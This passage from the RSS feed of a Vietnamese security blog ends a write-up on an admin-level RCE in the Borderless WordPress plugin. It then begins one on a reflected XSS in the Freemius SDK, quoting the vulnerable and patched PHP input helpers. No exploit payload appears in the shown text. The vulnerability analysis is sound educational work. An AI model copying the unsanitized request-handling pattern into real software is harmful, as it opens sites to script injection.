data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/result.png&#39; alt=&#34;Result&#34; height=&#34;757&#34; width=&#34;1491&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2024-11600 cho th·∫•y vi·ªác d√πng sai h√†m l·ªçc d·ªØ li·ªáu c√≥ th·ªÉ d·∫´n t·ªõi &lt;strong&gt;Remote Code Execution&lt;/strong&gt;. Plugin Borderless (‚â§ 1.6.0) l·∫•y tr·ª±c ti·∫øp gi√° tr·ªã &lt;code&gt;&amp;lt;font id&amp;gt;&lt;/code&gt; t·ª´ SVG, ch·ªâ l·ªçc b·∫±ng &lt;code&gt;sanitize_text_field()&lt;/code&gt;, r·ªìi ghi v√†o file PHP (&lt;code&gt;charmap.php&lt;/code&gt;). K·∫ª t·∫•n c√¥ng c√≥ quy·ªÅn Admin c√≥ th·ªÉ ch√®n m√£ PHP v√†o ƒë√≥ v√† ƒë∆∞·ª£c th·ª±c thi khi file ƒë∆∞·ª£c load. B·∫£n 1.6.1 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch d√πng &lt;code&gt;sanitize_file_name()&lt;/code&gt; v√† gi√° tr·ªã fallback.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n &lt;strong&gt;l·ªçc theo ƒë√∫ng ng·ªØ c·∫£nh&lt;/strong&gt; (ƒëang ghi v√†o PHP, kh√¥ng ph·∫£i text th∆∞·ªùng).&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng d√πng &lt;code&gt;sanitize_text_field()&lt;/code&gt; cho d·ªØ li·ªáu ghi v√†o m√£ ngu·ªìn th·ª±c thi.&lt;/li&gt;&#xA;&lt;li&gt;SVG/ZIP c≈©ng c√≥ th·ªÉ l√† vector t·∫•n c√¥ng.&lt;/li&gt;&#xA;&lt;li&gt;Vi·ªác t·ª± ƒë·ªông t·∫°o file &lt;code&gt;.php&lt;/code&gt; lu√¥n c·∫ßn ki·ªÉm so√°t ch·∫∑t ch·∫Ω.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://vdp.patchstack.com/database/wordpress/plugin/borderless/vulnerability/wordpress-borderless-plugin-1-5-9-authenticated-administrator-remote-code-execution-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Borderless Plugin &amp;lt;= 1.6.0 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2023-33999 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-05-cve-2023-33999/</link>
      <pubDate>Fri, 05 Dec 2025 20:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-05-cve-2023-33999/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Freemius SDK cho WordPress&lt;/strong&gt; kh√¥ng x·ª≠ l√Ω &lt;strong&gt;l√†m s·∫°ch (sanitize)&lt;/strong&gt; d·ªØ li·ªáu ƒë·∫ßu v√†o ho·∫∑c &lt;strong&gt;tho√°t (escape)&lt;/strong&gt; d·ªØ li·ªáu ƒë·∫ßu ra m·ªôt c√°ch ƒë·∫ßy ƒë·ªß, d·∫´n ƒë·∫øn l·ªó h·ªïng &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt;. ƒêi·ªÅu n√†y tr·ª±c ti·∫øp ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;h∆°n 1.000 plugin v√† giao di·ªán (theme)&lt;/strong&gt; ƒëang s·ª≠ d·ª•ng SDK n√†y.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://wpscan.com/vulnerability/35d2f1e7-a4f8-49fd-a8dd-bb2c26710f93/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2023-33999&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.5.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.5.10&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (6.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://freemius.com/help/documentation/wordpress-sdk/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Freemius SDK for WordPress&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;TablePress&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.1.4&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.1.5&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;about-freemius-sdk&#34;&gt;&lt;span&gt;About Freemius SDK&lt;/span&gt;&#xA;  &lt;a href=&#34;#about-freemius-sdk&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Freemius SDK&lt;/strong&gt; l√† m·ªôt b·ªô th∆∞ vi·ªán (Software Development Kit) d√†nh cho &lt;strong&gt;WordPress&lt;/strong&gt;, gi√∫p nh√† ph√°t tri·ªÉn plugin v√† theme d·ªÖ d√†ng th√™m c√°c ch·ª©c nƒÉng sau v√†o s·∫£n ph·∫©m c·ªßa h·ªç:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Qu·∫£n l√Ω &lt;strong&gt;b·∫£n quy·ªÅn (licensing)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;X·ª≠ l√Ω &lt;strong&gt;phi√™n b·∫£n mi·ªÖn ph√≠ / tr·∫£ ph√≠ (freemium / premium)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Cho ph√©p ng∆∞·ªùi d√πng &lt;strong&gt;k·∫øt n·ªëi t√†i kho·∫£n (opt-in)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Thu th·∫≠p &lt;strong&gt;th·ªëng k√™ s·ª≠ d·ª•ng (analytics)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Qu·∫£n l√Ω &lt;strong&gt;thanh to√°n v√† gia h·∫°n&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Hi·ªÉn th·ªã &lt;strong&gt;upsell / upgrade&lt;/strong&gt; trong dashboard WordPress&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Freemius SDK&lt;/strong&gt; kh√¥ng ph·∫£i l√† m·ªôt plugin ri√™ng bi·ªát m√† ƒë∆∞·ª£c nh√∫ng tr·ª±c ti·∫øp v√†o m√£ ngu·ªìn c·ªßa c√°c plugin ho·∫∑c theme kh√°c. V√¨ v·∫≠y, khi x·∫£y ra l·ªó h·ªïng trong &lt;strong&gt;Freemius SDK&lt;/strong&gt;, r·∫•t nhi·ªÅu s·∫£n ph·∫©m c≈©ng s·∫Ω b·ªã ·∫£nh h∆∞·ªüng theo. Plugin &lt;a href=&#34;https://wordpress.org/plugins/tablepress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;TablePress&lt;/strong&gt;&lt;/a&gt; l√† m·ªôt trong nh·ªØng tr∆∞·ªùng h·ª£p b·ªã t√°c ƒë·ªông, n√™n t√¥i ch·ªçn n√≥ ƒë·ªÉ ph√¢n t√≠ch.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói v2.5.9:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/**&#xA; * A helper method to fetch GET/POST user input with an optional default value when the input is not set.&#xA; * @author Vova Feldman (@svovaf)&#xA; *&#xA; * @param string      $key&#xA; * @param mixed       $def&#xA; * @param string|bool $type Since 1.2.1.7 - when set to &amp;#39;get&amp;#39; will look for the value passed via querystring, when&#xA; *                          set to &amp;#39;post&amp;#39; will look for the value passed via the POST request&amp;#39;s body, otherwise,&#xA; *                          will check if the parameter was passed in any of the two.&#xA; *&#xA; * @return mixed&#xA; */&#xA;function fs_request_get( $key, $def = false, $type = false ) {&#xA;    if ( is_string( $type ) ) {&#xA;        $type = strtolower( $type );&#xA;    }&#xA;&#xA;    /**&#xA;     * Note to WordPress.org Reviewers:&#xA;     *  This is a helper method to fetch GET/POST user input with an optional default value when the input is not set. The actual sanitization is done in the scope of the function&amp;#39;s usage.&#xA;     */&#xA;    switch ( $type ) {&#xA;        case &amp;#39;post&amp;#39;:&#xA;            $value = isset( $_POST[ $key ] ) ? $_POST[ $key ] : $def;&#xA;            break;&#xA;        case &amp;#39;get&amp;#39;:&#xA;            $value = isset( $_GET[ $key ] ) ? $_GET[ $key ] : $def;&#xA;            break;&#xA;        default:&#xA;            $value = isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $def;&#xA;            break;&#xA;    }&#xA;&#xA;    return $value;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;fs_request_get()&lt;/code&gt; d√πng ƒë·ªÉ &lt;strong&gt;l·∫•y gi√° tr·ªã c·ªßa m·ªôt tham s·ªë t·ª´ request c·ªßa ng∆∞·ªùi d√πng&lt;/strong&gt; (GET, POST ho·∫∑c c·∫£ hai), d·ª±a tr√™n t√™n key ƒë∆∞·ª£c truy·ªÅn v√†o. N·∫øu tham s·ªë kh√¥ng t·ªìn t·∫°i, h√†m s·∫Ω tr·∫£ v·ªÅ gi√° tr·ªã m·∫∑c ƒë·ªãnh. Tham s·ªë &lt;code&gt;$type&lt;/code&gt; cho ph√©p ch·ªâ ƒë·ªãnh r√µ ngu·ªìn d·ªØ li·ªáu l√† t·ª´ &lt;code&gt;GET&lt;/code&gt;, &lt;code&gt;POST&lt;/code&gt; ho·∫∑c t·∫•t c·∫£ (&lt;code&gt;REQUEST&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;D·ªØ li·ªáu tr·∫£ v·ªÅ kh√¥ng ƒë∆∞·ª£c l√†m s·∫°ch (sanitize) ho·∫∑c tho√°t k√Ω t·ª± (escape). N·∫øu gi√° tr·ªã n√†y ƒë∆∞·ª£c in ra tr√¨nh duy·ªát (v√≠ d·ª• b·∫±ng &lt;code&gt;echo&lt;/code&gt;) m√† kh√¥ng x·ª≠ l√Ω an to√†n, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n m√£ JavaScript ƒë·ªôc h·∫°i th√¥ng qua tham s·ªë request, t·ª´ ƒë√≥ d·∫´n ƒë·∫øn l·ªó h·ªïng &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√° v2.5.9:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function fs_request_get_raw( $key, $def = false, $type = false ) {&#xA;    if ( is_string( $type ) ) {&#xA;        $type = strtolower( $type );&#xA;    }&#xA;&#xA;    /**&#xA;     * Note to WordPress.org reviewers:&#xA;     * This is a helper function to fetch GET/POST user input with an optional default value when the input is not set. The actual sanitization is done in the scope of the function&amp;#39;s usage.&#xA;     */&#xA;    switch ( $type ) {&#xA;        case &amp;#39;post&amp;#39;:&#xA;            // phpcs:ignore WordPress.Security.NonceVerification.Missing&#xA;            $value = isset( $_POST[ $key ] ) ? $_POST[ $key ] : $def;&#xA;            break;&#xA;        case &amp;#39;get&amp;#39;:&#xA;            // phpcs:ignore WordPress.Security.NonceVerification.Recommended&#xA;            $value = isset( $_GET[ $key ] ) ? $_GET[ $key ] : $def;&#xA;            break;&#xA;        default:&#xA;            // phpcs:ignore WordPress.Security.NonceVerification.Recommended&#xA;            $value = isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $def;&#xA;            break;&#xA;    }&#xA;&#xA;    // Don&amp;#39;t unslash if the value itself is empty (empty string, null, empty array etc).&#xA;    return empty( $value ) ? $value : wp_unslash( $value );&#xA;}&#xA;&#xA;function fs_sanitize_input( $input ) {&#xA;    if ( is_array( $input ) ) {&#xA;        foreach ( $input as $key =&amp;gt; $value ) {&#xA;            $input[ $key ] = fs_sanitize_input( $value );&#xA;        }&#xA;    } else {&#xA;        // Allow empty values to pass through as-is, like `null`, `&amp;#39;&amp;#39;`, `0`, `&amp;#39;0&amp;#39;` etc.&#xA;        $input = empty( $input ) ? $input : sanitize_text_field( $input );&#xA;    }&#xA;&#xA;    return $input;&#xA;}&#xA;&#xA;function fs_request_get( $key, $def = false, $type = false ) {&#xA;    return fs_sanitize_input( fs_request_get_raw( $key, $def, $type ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ t√°ch vi·ªác &lt;strong&gt;l·∫•y d·ªØ li·ªáu&lt;/strong&gt; v√† &lt;strong&gt;l√†m s·∫°ch d·ªØ li·ªáu&lt;/strong&gt; th√†nh hai b∆∞·ªõc ri√™ng bi·ªát.&#xA;&lt;code&gt;fs_request_get_raw()&lt;/code&gt; ch·ªâ l·∫•y gi√° tr·ªã th√¥ t·ª´ GET/POST/REQUEST v√† b·ªè escape b·∫±ng &lt;code&gt;wp_unslash()&lt;/code&gt;, trong khi &lt;code&gt;fs_sanitize_input()&lt;/code&gt; ƒë·∫£m nhi·ªám vi·ªác l√†m s·∫°ch (k·ªÉ c·∫£ khi d·ªØ li·ªáu l√† m·∫£ng) b·∫±ng &lt;code&gt;sanitize_text_field()&lt;/code&gt;. Cu·ªëi c√πng, &lt;code&gt;fs_request_get()&lt;/code&gt; lu√¥n tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c l√†m s·∫°ch. Nh·ªù ƒë√≥, d·ªØ li·ªáu ƒë·ªôc h·∫°i kh√¥ng c√≤n ƒë∆∞·ª£c tr·∫£ ra tr·ª±c ti·∫øp, gi√∫p gi·∫£m nguy c∆° khai th√°c &lt;strong&gt;Reflected XSS&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;H√†m &lt;code&gt;fs_request_get()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ·ªü r·∫•t nhi·ªÅu n∆°i&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/call.png&#34; title=&#34;127 references&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/call.png&#34; data-sub-html=&#34;&lt;h2&gt;Call&lt;/h2&gt;&lt;p&gt;127 references&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; 